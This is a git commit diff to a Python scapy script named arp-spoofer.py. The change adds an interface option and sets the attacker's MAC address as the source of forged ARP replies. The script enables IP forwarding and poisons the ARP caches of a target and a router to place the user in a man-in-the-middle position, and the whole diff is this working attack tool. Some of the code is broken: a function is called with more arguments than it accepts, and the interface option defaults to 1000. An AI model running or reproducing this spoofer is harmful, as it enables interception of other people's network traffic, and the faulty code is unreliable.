e1b8f925ba5a315ed3a943ae798bd29f61516f10
koushik <58215686+koushikfs@users.noreply.github.com>
2021-07-18 13:20:11 +0530

    Update arp-spoofer.py

--- arp-spoofer.py
+++ arp-spoofer.py
@@ -10,8 +10,9 @@ def get_arguments():
     arguments.add_option("-s", "--spoof", metavar='\b', dest="spoof_ip", help="spoof ip[machine-2](router or another machine on local network)")
     arguments.add_option("-p", "--sleep", metavar='\b', dest="sleeptime", default=0, help="time to sleep after sending a packet(default=0)")
     arguments.add_option("-c", "--count", metavar='\b', dest="count", default=1000, help="number of packets to be sent(default=1000)")
+    arguments.add_option("-i", "--interface", metavar='\b', dest="interface", default=1000, help="give interface")
     values, options = arguments.parse_args()
-    if not (values.target_ip and values.spoof_ip):
+    if not (values.target_ip and values.spoof_ip and values.interface):
         arguments.error("give arguments\n[+]HELP: python3 arp_spoofer.py -h")
     return values
 
@@ -25,7 +26,17 @@ def get_mac(ip):
         return sendpacket[0][1].hwsrc
     except IndexError:
         print("[-]{} is not active".format(ip))
-        print("[+]OK Quiting...")
+        print("\n[+]OK Quiting...")
+        exit()
+
+        
+def get_interface_mac(interface):
+    ifconfig_result = subprocess.check_output(["ifconfig", values.interface])
+    extracted_result = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_result))
+    if extracted_result:
+        return extracted_result.group(0)
+    else:
+        print("[-]couldn't find any mac address for the given interface")
         exit()
 
 
@@ -34,7 +45,6 @@ def restore(target_ip, spoof_ip):
         spoof_real_mac = get_mac(spoof_ip)
         target_mac = get_mac(target_ip)
         packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwsrc=spoof_real_mac, hwdst=target_mac)
-        # print(packet.summary())
         scapy.send(packet, count=2, verbose=False)
         p = target_ip
         target_ip = spoof_ip
@@ -47,26 +57,19 @@ def spoof(target_ip, spoof_ip, count, sleeptime):
     print("Date:23/06/2021\n")
     subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
     print("[+]ip forwarding enabled")
+    interface_mac = get_interface_mac(interface)
     h = int(sleeptime)
     v = int(count)
     try:
         for i in range(1, v+1):
             target_mac = get_mac(target_ip)
-            # print("[+]target mac: {}".format(target_mac))
-            create_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
+            create_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac, hwsrc=interface_mac)
             scapy.send(create_packet, verbose=False)
-            # ( machine1 )-<->-( YOU )-<->-( machine2 )
-            # destination = scapy.Ether(dst=target_mac)
-            # final_packet = destination/create_packet
-            # send_packet = scapy.srp(final_packet, timeout=1, verbose=False)
             time.sleep(h)
             p = target_ip
             target_ip = spoof_ip
             spoof_ip = p
-            # print("[+]target ip: {}".format(target_ip))
-            # print("[+]spoof ip: {}".format(spoof_ip))
             print("\r[+]sent {} packets to both machines, you are MITM :-)".format(i), end=" ")
-            # print("---------------------------------------------------------------")
     except KeyboardInterrupt:
         restore(target_ip, spoof_ip)
         print("[+]OK Quiting... youre not MITM :-(")
@@ -77,4 +80,4 @@ def spoof(target_ip, spoof_ip, count, sleeptime):
 
 
 values = get_arguments()
-spoof(values.target_ip, values.spoof_ip, values.count, values.sleeptime)
+spoof(values.target_ip, values.spoof_ip, values.count, values.sleeptime, values.interface)
